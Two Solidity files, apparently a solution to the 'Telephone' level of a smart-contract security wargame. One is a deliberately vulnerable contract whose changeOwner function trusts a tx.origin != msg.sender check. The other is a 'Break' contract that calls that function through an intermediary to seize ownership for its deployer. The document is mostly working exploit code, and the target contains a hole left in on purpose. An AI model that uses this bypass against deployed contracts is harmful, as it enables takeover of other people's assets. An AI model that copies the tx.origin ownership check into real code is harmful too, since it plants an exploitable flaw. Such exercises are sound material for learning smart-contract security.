// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Telephone.sol";

contract Break {
    Telephone public telephone;
    address public owner;

    constructor(address _teladdress) {
        telephone = Telephone(_teladdress);
        owner = msg.sender;
    }

    function makecall() public {
        telephone.changeOwner(owner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}